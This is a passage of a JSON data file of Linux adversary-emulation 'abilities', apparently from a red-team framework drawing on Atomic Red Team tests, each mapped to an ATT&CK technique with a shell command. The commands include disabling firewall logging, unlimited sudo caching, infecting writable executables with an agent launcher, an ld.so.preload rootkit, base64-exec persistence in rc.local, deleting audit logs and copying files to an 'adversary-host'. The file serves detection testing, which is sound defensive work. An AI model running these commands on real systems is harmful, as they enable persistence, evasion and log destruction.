EXIT'", "unlocks": []}, {"id": "97eb1eb07611c5f98768250b1b705a67", "ability_name": "Trap SIGINT", "description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n", "tactic": "multiple", "technique": "Event Triggered Execution: Trap", "platform": "linux", "requirements": [], "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'", "unlocks": []}, {"id": "c01780a26cb87c321879cb4b8527ee6f", "ability_name": "Turn off UFW logging", "description": "Turn off the Uncomplicated Firewall (UFW) logging. \n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify System Firewall", "platform": "linux", "requirements": ["root"], "command": "ufw logging off", "unlocks": ["fw.disabled"]}, {"id": "f1debf348737a5744911d71cec0ca4ea", "ability_name": "Unlimited sudo cache timeout", "description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "tactic": "multiple", "technique": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching", "platform": "linux", "requirements": ["sudo"], "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers; sudo visudo -c -f /etc/sudoers", "unlocks": []}, {"id": "8e7c28877a9c7826fece190f185b534c", "ability_name": "Use Space Before Command to Avoid Logging to History", "description": "Using a space before a command causes the command to not be logged in the Bash History file\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Command History", "platform": "linux", "requirements": [], "command": "hostname; whoami", "unlocks": []}, {"id": "335cea7b-bec0-48c6-adfb-6066070f5f68", "ability_name": "View Processes", "description": "Display information about current system processes", "tactic": "discovery", "technique": "Process Discovery", "platform": "linux", "requirements": [], "command": "ps", "unlocks": []}, {"id": "59703a9c143cdc58377b103a1c7acc59", "ability_name": "View accounts with UID 0", "description": "View accounts with UID 0\n", "tactic": "discovery", "technique": "Account Discovery: Local Account", "platform": "linux", "requirements": [], "command": "grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt 2>/dev/null", "unlocks": []}, {"id": "6c91884e-11ec-422f-a6ed-e76774b0daac", "ability_name": "View printer queue", "description": "View details of queued documents in printer queue", "tactic": "discovery", "technique": "Peripheral Device Discovery", "platform": "linux", "requirements": [], "command": "lpq -a", "unlocks": ["host.print.file"]}, {"id": "ff603d97a57715d3c2a1de941419d661", "ability_name": "View sudoers access", "description": "(requires root)\n", "tactic": "discovery", "technique": "Account Discovery: Local Account", "platform": "linux", "requirements": ["sudo"], "command": "sudo cat /etc/sudoers > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt", "unlocks": []}, {"id": "10681f2f-be03-44af-858d-f2b0812df185", "ability_name": "Weak executable files", "description": "Locate and infect files with weak but executable perms", "tactic": "privilege-escalation", "technique": "Hijack Execution Flow: Services File Permissions Weakness", "platform": "linux", "requirements": [], "command": "find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF \"54NDC47_SCRIPT\" \"{}\" || echo \"#54NDC47_SCRIPT\\n\" \"chmod +x sandcat.go-linux && sandcat.go-linux\" >> \"{}\"; ls \"{}\" ' \\; | echo \"complete\"", "unlocks": []}, {"id": "181d6efe03889f7c26073257a90c4a1e", "ability_name": "What shell is running", "description": "An adversary will want to discover what shell is running so that they can tailor their attacks accordingly. The following commands will discover what shell is running.\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "echo $0; if $(env |grep \"SHELL\" >/dev/null); then env |grep \"SHELL\"; fi; if $(printenv SHELL >/dev/null); then printenv SHELL; fi", "unlocks": ["shell.info"]}, {"id": "ba3f3acd2d5a1429dfc2e4612b1a8953", "ability_name": "What shells are available", "description": "An adversary may want to discover which shell's are available so that they might switch to that shell to tailor their attacks to suit that shell. The following commands will discover what shells are available on the host.\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "cat /etc/shells", "unlocks": ["shell.info"]}, {"id": "7da5d03a766f4d6b2dbaf8a8a17d53ad", "ability_name": "X Windows Capture", "description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n", "tactic": "collection", "technique": "Screen Capture", "platform": "linux", "requirements": [], "command": "xwd -root -out /tmp/T1113_desktop.xwd; xwud -in /tmp/T1113_desktop.xwd", "unlocks": []}, {"id": "89955f55-529d-4d58-bed4-fed9e42515ec", "ability_name": "cURL socket address", "description": "See the raw content of a socket", "tactic": "collection", "technique": "Data from Local System", "platform": "linux", "requirements": [], "command": "curl #{remote.host.socket}", "unlocks": []}, {"id": "6030515771f31561f2b87d5832743888", "ability_name": "chattr - Remove immutable file attribute", "description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n", "tactic": "defense-evasion", "technique": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "platform": "linux", "requirements": [], "command": "chattr -i /var/spool/cron/root", "unlocks": []}, {"id": "b5d829c249e3577bebb081b82cb4edcf", "ability_name": "chmod - Change file or folder mode (numeric mode)", "description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n", "tactic": "defense-evasion", "technique": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "platform": "linux", "requirements": [], "command": "chmod 755 /tmp/AtomicRedTeam/atomics/T1222.002", "unlocks": []}, {"id": "f7de34810a85331e65c656023acb549b", "ability_name": "chmod - Change file or folder mode (numeric mode) recursively", "description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n", "tactic": "defense-evasion", "technique": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "platform": "linux", "requirements": [], "command": "chmod -R 755 /tmp/AtomicRedTeam/atomics/T1222.002", "unlocks": []}, {"id": "26ed797080bee3874bb18301a88f1be9", "ability_name": "chmod - Change file or folder mode (symbolic mode)", "description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n", "tactic": "defense-evasion", "technique": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "platform": "linux", "requirements": [], "command": "chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002", "unlocks": []}, {"id": "27b1c45ca84b25f3b97e298a7f2ca9c3", "ability_name": "chmod - Change file or folder mode (symbolic mode) recursively", "description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n", "tactic": "defense-evasion", "technique": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "platform": "linux", "requirements": [], "command": "chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002", "unlocks": []}, {"id": "689b764ccd17d8c4b587ce1a6f73cd65", "ability_name": "chown - Change file or folder mode ownership only", "description": "Changes a file or folder's ownership only using chown.\n", "tactic": "defense-evasion", "technique": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "platform": "linux", "requirements": [], "command": "chown root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml", "unlocks": []}, {"id": "560a1774602fdd048fe593bf31052ef4", "ability_name": "chown - Change file or folder ownership and group", "description": "Changes a file or folder's ownership and group information using chown.\n", "tactic": "defense-evasion", "technique": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "platform": "linux", "requirements": [], "command": "chown", "unlocks": []}, {"id": "12ba4650b2b42fb4b58989faacc03061", "ability_name": "chown - Change file or folder ownership and group recursively", "description": "Changes a file or folder's ownership and group information recursively using chown.\n", "tactic": "defense-evasion", "technique": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "platform": "linux", "requirements": [], "command": "chown -R", "unlocks": []}, {"id": "791086a91572971cf5462ebdb2c82007", "ability_name": "chown - Change file or folder ownership recursively", "description": "Changes a file or folder's ownership only recursively using chown.\n", "tactic": "defense-evasion", "technique": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "platform": "linux", "requirements": [], "command": "chown -R root /tmp/AtomicRedTeam/atomics/T1222.002", "unlocks": []}, {"id": "1a35d5a1ced99d3e5e764ac6f5ba727f", "ability_name": "dynamic-linker based rootkit (libprocesshider)", "description": "Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).\n", "tactic": "defense-evasion", "technique": "Rootkit", "platform": "linux", "requirements": [], "command": "echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload; /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"", "unlocks": []}, {"id": "0093c0e0-68b6-4cab-b0d4-2b40b3c78f71", "ability_name": "enumerate VMs", "description": "Enumerate running virtual machines on hypervisor", "tactic": "discovery", "technique": "Process Discovery", "platform": "linux", "requirements": [], "command": "acrnctl list", "unlocks": ["hypervisor.vm.name"]}, {"id": "2cc4d863d4b7c634e8b6add14cf8c7a4", "ability_name": "macOS/Linux - Overwrite file with DD", "description": "Overwrites and deletes a file using DD.\nTo stop the test, break the command with CTRL/CMD+C.\n", "tactic": "impact", "technique": "Data Destruction", "platform": "linux", "requirements": [], "command": "dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes", "unlocks": []}, {"id": "5f407c31b29d92be4648b3cff37e0abe", "ability_name": "macOS/Linux - Simulate CPU Load with Yes", "description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n", "tactic": "impact", "technique": "Resource Hijacking", "platform": "linux", "requirements": [], "command": "yes > /dev/null", "unlocks": []}, {"id": "6d40caedb0738bd37dd673f0321ab584", "ability_name": "psexec.py (Impacket)", "description": "Will execute a command on the remote host with Impacket psexec.py script.\n", "tactic": "execution", "technique": "System Services: Service Execution", "platform": "linux", "requirements": [], "command": "psexec.py '/Administrator:P@ssw0rd1@127.0.0.1' 'whoami'", "unlocks": []}, {"id": "9bd17863cd45f82002a6f011de139363", "ability_name": "rc.common", "description": "Modify rc.common\n", "tactic": "multiple", "technique": "Boot or Logon Initialization Scripts: Rc.common", "platform": "linux", "requirements": [], "command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common; sudo chmod +x /etc/rc.common", "unlocks": []}, {"id": "77f61dda65d9eefb8f8a08321e1c00c8", "ability_name": "rc.local", "description": "Modify rc.local\n", "tactic": "multiple", "technique": "Boot or Logon Initialization Scripts: Rc.common", "platform": "linux", "requirements": [], "command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.local; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.local; sudo chmod +x /etc/rc.local", "unlocks": []}, {"id": "0e0bf52a7d3c64d3b9c8a6106bf92926", "ability_name": "rm -rf", "description": "Delete system and audit logs\n", "tactic": "defense-evasion", "technique": "Indicator Removal on Host: Clear Linux or Mac System Logs", "platform": "linux", "requirements": [], "command": "sudo rm -rf /private/var/log/system.log*; sudo rm -rf /private/var/audit/*", "unlocks": []}, {"id": "50a319ee67cdb786e6207194c8d61c72", "ability_name": "rsync remote file copy (pull)", "description": "Utilize rsync to perform a remote file copy (pull)\n", "tactic": "command-and-control", "technique": "Ingress Tool Transfer", "platform": "linux", "requirements": [], "command": "rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files", "unlocks": []}, {"id": "866227c57aaeb1e0e9d761e15fc29e44", "ability_name": "rsync remote file copy (push)", "description": "Utilize rsync to perform a remote file copy (push)\n", "tactic": "command-and-control", "technique": "Ingress Tool Transfer", "platform": "linux", "requirements": [], "command": "rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files", "unlocks": []}, {"id": "f4e6b028e9c60c515541d52921fa2b48", "ability_name": "scp remote file copy (pull)", "description": "Utilize scp to perform a remote file copy (pull)\n", "tactic": "command-and-control", "technique": "Ingress Tool Transfer", "platform": "linux", "requirements": [], "command": "scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/", "unlocks": []}, {"id": "2f872c3c1107218205093c16a8cb6d66", "ability_name": "scp remote file copy (push)", "description": "Utilize scp to perform a remote file copy (push)\n", "tactic": "command-and-control", "technique": "Ingress Tool Transfer", "platform": "linux", "requirements": [], "command": "scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/", "unlocks": []}, {"id": "2443f86c5b3067f3c3fda59384c566b6", "ability_name": "sftp remote file copy (pull)", "description": "Utilize sftp to perform a remote file copy (pull)\n", "tactic": "command-and-control", "technique": "Ingress Tool Transfer", "platform": "linux", "requirements": [], "command": "sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/", "unlocks": []}, {"id": "806814854866002bd861b76b7a2ee2c9", "ability_name": "sftp remote file copy (push)", "description": "Utilize sftp to perform a remote file copy (push)\n", "tactic": "command-and-control", "technique": "Ingress Tool Transfer", "platform": "linux", "requirements": [], "command": "sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'", "unlocks": []}, {"id": "253e8dc2d0195de95eae8e9ec7e350a9", "ability_name": "whois file download", "description": "Download a remote file using the whois utility\n", "tactic": "command-and-control", "technique": "Ingress Tool Transfer", "platform": "linux", "requirements": [], "command": "timeout --preserve-status 1 whois -h localhost -p 8443 \"Hello from Atomic Red Team test T1105\" > /tmp/T1105.whois.out", "unlocks": []}]